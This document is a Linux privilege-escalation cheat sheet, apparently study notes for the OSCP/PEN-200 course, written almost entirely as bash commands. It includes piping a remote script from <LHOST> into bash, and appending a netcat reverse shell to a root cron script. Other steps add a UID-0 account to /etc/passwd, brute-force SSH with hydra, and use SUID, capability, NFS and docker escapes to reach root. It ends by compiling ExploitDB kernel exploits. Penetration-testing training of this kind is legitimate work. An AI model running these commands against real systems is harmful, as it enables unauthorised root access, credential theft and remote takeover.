# Linux PrivEsc Commands

```bash
# ============================================================
# STEP 0 — MANUAL BASELINE FIRST
# ============================================================

# Identity / users
whoami
id
hostname
cat /etc/passwd

# OS / kernel / architecture
cat /etc/issue
cat /etc/os-release
uname -a
arch 2>/dev/null

# Privileged processes / possible credentials in argv
ps auxww
watch -n 1 "ps -aux | grep pass"

# Environment / user trails
# Inspect full env too — a credential variable may not contain the word 'password'.
env
env | grep -iE 'pass|cred|auth|key|secret|token'
cat ~/.bashrc ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null

# Network / local-only services / pivot clues
ip a
routel 2>/dev/null || route -n
ss -anp

# Firewall artifacts that may be readable without root
cat /etc/iptables/rules.v4 2>/dev/null

# Cron discovery
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
sudo crontab -l 2>/dev/null
grep "CRON" /var/log/syslog 2>/dev/null

# Installed applications (Debian)
dpkg -l

# Writable files/directories
find / -writable -type d 2>/dev/null

# Storage / hidden data sources
cat /etc/fstab
mount
lsblk

# Kernel modules / drivers
lsmod
/sbin/modinfo <MODULE>

# ============================================================
# STEP 1 — AUTOMATED ENUMERATION, THEN VERIFY FINDINGS
# ============================================================

curl http://<LHOST>/linpeas.sh | bash 2>/dev/null | tee /tmp/lp.out
# Look for RED/YELLOW highlights, but manually verify them.

# PEN-200 alternative:
./unix-privesc-check standard > output.txt

# ============================================================
# STEP 2 — SUDO
# ============================================================

sudo -l
# For every permitted binary, inspect the exact command/path/arguments.
# Check GTFOBins where applicable.
# Example from PEN-200: apt-get can invoke less, then a shell:
# sudo apt-get changelog apt
# !/bin/sh

# If a valid-looking GTFOBins path fails, inspect logs/security controls:
cat /var/log/syslog | grep -iE 'apparmor|denied|audit' 2>/dev/null

# ============================================================
# STEP 3 — SUID / SGID
# ============================================================

# SUID: executes with the file owner's effective UID
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
# Equivalent PEN-200 form:
find / -perm -u=s -type f 2>/dev/null

# SGID: executes with the file owner's group privileges
find / -perm -2000 -type f 2>/dev/null | xargs ls -la

# Each unusual binary -> GTFOBins / inspect behavior.
# PEN-200 SUID find example (if find itself has SUID root):
find /home/$USER/Desktop -exec /usr/bin/bash -p \;
# bash -p preserves the privileged effective UID in this case.

# ============================================================
# STEP 4 — CAPABILITIES
# ============================================================

/usr/sbin/getcap -r / 2>/dev/null
# cap_setuid+ep is especially interesting.
# PEN-200 example when Perl has cap_setuid+ep:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# ============================================================
# STEP 5 — CREDENTIAL HUNT / USER HOPPING
# ============================================================

# Try recovered passwords against relevant local users/services.
# Example local switch:
su - <USER>

# If a discovered password suggests a narrow pattern, PEN-200 demonstrates:
crunch 6 6 -t Lab%%% > wordlist
hydra -l <USER> -P wordlist <TARGET_IP> -t 4 ssh -V

# Re-run sudo rights after changing users:
sudo -l

# If permitted to capture traffic, inspect loopback for clear-text creds:
sudo tcpdump -i lo -A | grep "pass"

# ============================================================
# STEP 6 — CRON / WRITABLE PRIVILEGED SCRIPTS
# ============================================================

# Reconfirm exact job + user from crontab/logs, then inspect target script:
ls -lah /path/to/script
cat /path/to/script

# Writable script run as root -> append controlled command/reverse shell.
# PEN-200 pattern:
# echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 1234 >/tmp/f' >> /path/to/root-cron-script
# Attacker:
# nc -lnvp 1234

# Also investigate wildcard-based jobs (tar/rsync) where applicable.

# ============================================================
# STEP 7 — WRITABLE /etc/passwd
# ============================================================

# If /etc/passwd is actually writable, a password hash in field 2 takes
# precedence for authentication. Create a UID/GID 0 account.
openssl passwd w00t
# Then use the returned hash:
# echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
# su root2

# ============================================================
# STEP 8 — NFS no_root_squash (extra OSCP path already in notes)
# ============================================================

cat /etc/exports
# If: /share *(rw,no_root_squash) ->
# On ATTACKER (as root):
mkdir /mnt/nfs && mount -t nfs <TARGET_IP>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/ && chmod +s /mnt/nfs/bash
# On VICTIM, run the SUID bash from the shared path:
# /path/to/share/bash -p

# ============================================================
# STEP 9 — DOCKER GROUP (extra OSCP path already in notes)
# ============================================================

id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ============================================================
# STEP 10 — LOCAL SERVICES / PIVOT CLUES
# ============================================================

ss -anp
# 127.0.0.1-only privileged service -> interact locally or port-forward.
# Multiple NICs/routes -> note for pivoting.

# ============================================================
# STEP 11 — glibc / Looney Tunables (extra existing note)
# ============================================================

ldd --version
# Existing vault path: if the exact distro/glibc build is affected,
# validate the PoC and prerequisites before execution.

# ============================================================
# STEP 12 — KERNEL EXPLOIT LAST
# ============================================================

cat /etc/issue
uname -r
arch

# On Kali, search by distro + kernel + local privilege escalation:
searchsploit "linux kernel <DISTRO/VERSION> Local Privilege Escalation"

# Copy source from ExploitDB, read the header/instructions first:
# cp /usr/share/exploitdb/exploits/linux/local/<ID>.c .
# head -n 20 <EXPLOIT>.c

# Prefer compiling on the target when gcc exists to reduce
# architecture/library compatibility problems:
gcc <EXPLOIT>.c -o <EXPLOIT>
file <EXPLOIT>
./<EXPLOIT>

# Kernel exploits can destabilize/crash a host. Match distro, kernel,
# architecture and exploit prerequisites before running them.
```

See [[Manual Enumeration and Credential Hunting]] for what each enumeration step is trying to reveal.
